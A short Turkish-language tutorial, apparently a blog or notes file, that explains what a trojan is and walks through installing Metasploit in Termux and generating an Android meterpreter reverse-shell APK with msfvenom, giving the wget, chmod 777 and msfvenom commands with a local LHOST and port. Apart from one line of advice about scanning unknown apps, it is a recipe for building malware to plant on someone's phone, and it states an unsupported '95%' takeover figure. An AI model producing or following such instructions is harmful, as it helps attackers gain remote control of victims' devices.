@@ -1,0 +1,43 @@
+Trojan Nedir?
+
+Truva atı olarakda bilinen bu virüs çok zararlıdır.
+En başta kötü bir niyetle yapılmamıştı.
+Ama sonradan kötüye kullanılmaya Başladı
+saldırganın herşeyi ele geçirebilme olasıığı %95'dir
+
+Trojanı Nasıl oluştururum
+
+Bunun için metasploit denen bir araca ihtiyacımız var
+metasploit iki bölümden oluşuyor msfvenom ve msfconsole
+msfvenom ile trojan hazırlanıyor
+msfconsole ile trojanımızı dinleyip yönetiyoruz
+
+Bilgi:
+
+Trojanlardan korunmak için bilmediğiniz uygulamaları
+hemen indirip açmayın. İndirirseniz bile virüs taraması yapmadan açmayın. Bu bir word dosyası bile olsa
+
+Şimdi Esas Konumuza Gelelim
+
+İndireme Ve Kurulum İçin,
+
+wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
+
+chmod 777 metasploit.sh
+
+cd metasploit-framework
+
+chmod 777 *
+
+Msfvenomu kullanmak için payloadları bilmeniz gerekir
+payloadları öğrenmek için "./msfvenom --list-payload" yazın
+bütün payloadları gösterecektir.
+Ama ben sadece windows için olan payloadları görmek istiyorum döyorsanız
+bu payloadları msfconsole'dan "search windows" yazarak windows için olan
+payloanları görebilirsiniz mesela şimdi android için bir virüs hazırlayalım
+
+./msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.32 LPORT=4163 -O trojan.apk
+
+Trojanımız 4163 portunu kullanarak bağlantı kuruyor sadece kendi ağınızda kullanabilirsiniz.
+sizin modeminize bağlı olmayan bir kişi bu bu trojanı açsa bile siz onu hackleyemezsiniz
+ilerde nasıl trojanı dinleyeceğimizi gösteriyorum şimdilik bu kadar
